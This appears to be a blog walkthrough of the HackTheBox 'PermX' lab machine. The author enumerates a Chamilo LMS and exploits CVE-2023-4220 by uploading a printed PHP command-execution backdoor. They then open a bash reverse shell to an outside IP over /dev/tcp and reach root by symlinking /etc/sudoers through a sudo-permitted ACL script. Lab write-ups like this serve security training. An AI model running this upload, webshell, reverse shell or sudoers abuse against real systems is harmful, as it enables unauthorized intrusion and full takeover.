![](https://miro.medium.com/v2/resize:fit:875/1*uZ9qFbGYar4afo8n_rQeQA.png)

Hello friends and welcome again, so today's topic is a walkthrough for the Permx machine from HTB, letâ€™s get started!

# Enumeration and Findings

First I ran the Nmap to scan our machine:

![](https://miro.medium.com/v2/resize:fit:875/1*WKU5xmWMftpv0tZLe19hjg.png)

so we have SSH open and port 8 TCP with Apache installed, Apache is a good target for us in these situations so I went ahead and tried to visit our domainÂ `permx.htb`Â but first, letâ€™s add it to ourÂ `/etc/hosts`Â file

![](https://miro.medium.com/v2/resize:fit:875/1*YAY_S7dAxWExAcRyUlnclg.png)

going through the app we can tell itâ€™s a static website

![](https://miro.medium.com/v2/resize:fit:875/1*VWJ_6Ku-kr06zj7JlwsROw.png)

so I started fuzzing theÂ **Vhosts**

![](https://miro.medium.com/v2/resize:fit:875/1*_slx4mXyBwvGgt4Pjv6_Yg.png)

and here we have 2 subdomains (www, lms) the lms one is an admin login panel

![](https://miro.medium.com/v2/resize:fit:875/1*9eLlsGmCSbVWri6kPjOxVQ.png)

at this point, there is much to talk about

at the bottom right of the page, I found the admin email and name:Â `admin@permx.htb`Â I took note of it maybe we will use it as we are already on an ADMIN login page, who knows  
but no actually itâ€™s not that easy, this finding is useless at this machineğŸ˜…

I was about to start fuzzing again for directories and files but I checked theÂ `/robots.txt`Â first and itâ€™s looking good

![](https://miro.medium.com/v2/resize:fit:875/1*koMVL_s6dDAO_Rc_IQcw9g.png)

we can find many routes, by visiting the documentation we know some info as the exact version of Chamilo

![](https://miro.medium.com/v2/resize:fit:875/1*kSNa_8C9wDVh1twj9_LSPw.png)

# Exploitation

so I started searching for any CVE or exploits for it and found this oneÂ [Chamilo-CVE-2023â€“4220-Exploit](https://github.com/Ziad-Sakr/Chamilo-CVE-2023-4220-Exploit)Â Itâ€™s about Unauthenticated Big Upload File Remote Code Execution

tried to use the automated bash script at the exploit with theÂ [PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell)

`sudo ./CVE-2023-4220.sh -f /home/kite/Downloads/php-reverse-shell.php -h http://lms.permx.htb/ -p 4444`

and set up a netcat listenerÂ `nc -nlvp 4444`Â and here we go!

![](https://miro.medium.com/v2/resize:fit:875/1*AtZQftsGLRpQJmoMk1uEAg.png)

but the shell has a problem and it doesnâ€™t work as u see, but it has been uploaded successfully

![](https://miro.medium.com/v2/resize:fit:875/1*GFzsu0SYilI5po8FfYlBUg.png)

so letâ€™s try it manually using thisÂ [simple backdoor](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/php/simple-backdoor.php)Â putting it into the â€œshell.phpâ€ file:

```
<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->  
  
<?php  
  
if(isset($_REQUEST['cmd'])){  
        echo "<pre>";  
        $cmd = ($_REQUEST['cmd']);  
        system($cmd);  
        echo "</pre>";  
        die;  
}  
  
?>  
  
Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd  
  
<!--    http://michaeldaw.org   2006    -->
```
and executing this command:

`curl -F 'bigUploadFile=@shell.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'`

letâ€™s test it by executing the id command

`http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?cmd=id`

![](https://miro.medium.com/v2/resize:fit:875/1*Cn2qP3rZ-rVCh7gvosEURA.png)

works fine

letâ€™s inject our reverse shellÂ `bash -c â€˜bash -i >& /dev/tcp/10.10.16.66/4444 0>&1â€™`

but URL encoded:Â `bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.66%2F4444%200%3E%261%27`

`http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.66%2F4444%200%3E%261%27`

and then setup netcatÂ `nc -nlvp 4444`Â listener and it worked fine

![](https://miro.medium.com/v2/resize:fit:875/1*TCFRxqus-muHC1l3ivVWmQ.png)

# Privilege Escalation

trying to upgrade the shell to be interactive tty

python3 -c 'import pty;pty.spawn("/bin/bash")                            
export TERM=xterm

we can downloadÂ `linpeas.sh`Â toÂ `/var/www/html`

![](https://miro.medium.com/v2/resize:fit:520/1*Hr7QBoOQYysRTyK9BQdc6g.png)

2 users on the system

![](https://miro.medium.com/v2/resize:fit:875/1*yt1pu9vwA2wy8uWlZqhg2w.png)

tried this pass with the mtz user and it worked!  
I closed this session and used SSH to connect since itâ€™s better and we got the first user

![](https://miro.medium.com/v2/resize:fit:875/1*iUvHTJf_WFdrgvgVZmtr9w.png)

![](https://miro.medium.com/v2/resize:fit:875/1*ZTMs0mZpJAo9T6nUbCSG6g.png)

trying to get the root user I checked what I could do with sudo:Â `sudo -l`

![](https://miro.medium.com/v2/resize:fit:875/1*7y3fVZxZDU-U4WZHFu50Xw.png)

we can notice theÂ `/opt/acl.sh`Â fileÂ ==that==Â we can run with no password:

```
#!/bin/bash  
  
if [ "$#" -ne 3 ]; then  
    /usr/bin/echo "Usage: $0 user perm file"  
    exit 1  
fi  
  
user="$1"  
perm="$2"  
target="$3"  
  
if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then  
    /usr/bin/echo "Access denied."  
    exit 1  
fi  
  
# Check if the path is a file  
if [ ! -f "$target" ]; then  
    /usr/bin/echo "Target must be a file."  
    exit 1  
fi
```

this script takes the user, permissions, and the target file as parameters and changes permissions for this file, but the target file has to be in our home folder

So letâ€™s just make a symbolic link to the sudoers file and change our permissions on this file to read/write

ln -s /etc/sudoers Sir_Reda  
sudo /opt/acl.sh mtz rw /home/mtz/Sir_Reda

after granting our user ALL privileges

![](https://miro.medium.com/v2/resize:fit:460/1*heQymUPi-BqxBwC5ddIXvg.png)

then sudo su to root user

![](https://miro.medium.com/v2/resize:fit:875/1*TuzMPjznGT9haUd7PAPhtg.png)

thatâ€™s it for today If you have any questions, You can reach me through my social caves:

Twitter(X):Â [https://twitter.com/HunterXReda](https://twitter.com/HunterXReda)  
Linkedin:Â [https://www.linkedin.com/in/0xhunter/](https://www.linkedin.com/in/0xhunter/)  
Facebook:Â [https://www.facebook.com/0xHunterr](https://www.facebook.com/0xHunterr)
